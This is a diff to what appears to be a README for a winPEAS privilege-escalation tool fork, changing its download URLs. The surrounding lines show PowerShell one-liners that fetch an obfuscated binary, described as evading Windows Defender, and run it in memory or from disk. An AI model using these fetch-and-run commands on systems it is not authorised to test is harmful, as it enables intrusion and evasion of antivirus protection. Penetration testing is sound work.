@@ -17,7 +17,7 @@ Precompiled binaries:
 
 ```bash
 # Get latest clean release (Windows Defender evasion)
-$url = "https://github.com/moscowchill/PEASS-ng-MC/raw/refs/heads/master/winPEAS/winPEASexe/Dotfuscator/Dotfuscated/winPEAS_final.exe"
+$url = "https://github.com/moscowchill/PEASS-ng/raw/refs/heads/main/winPEAS/winPEASexe/Dotfuscator/Dotfuscated/winPEAS_final.exe"
 
 # One liner to download and execute winPEAS from memory in a PS shell
 $wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
@@ -28,7 +28,7 @@ $wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBas
 
 # Download to disk and execute (super noisy)
 $wc = New-Object System.Net.WebClient
-$wc.DownloadFile("https://github.com/moscowchill/PEASS-ng-MC/raw/refs/heads/master/winPEAS/winPEASexe/Dotfuscator/Dotfuscated/winPEAS_final.exe", "winPEAS.exe")
+$wc.DownloadFile("https://github.com/moscowchill/PEASS-ng/raw/refs/heads/main/winPEAS/winPEASexe/Dotfuscator/Dotfuscated/winPEAS_final.exe", "winPEAS.exe")
 .\winPEAS.exe
 
 # Load from disk in memory and execute:
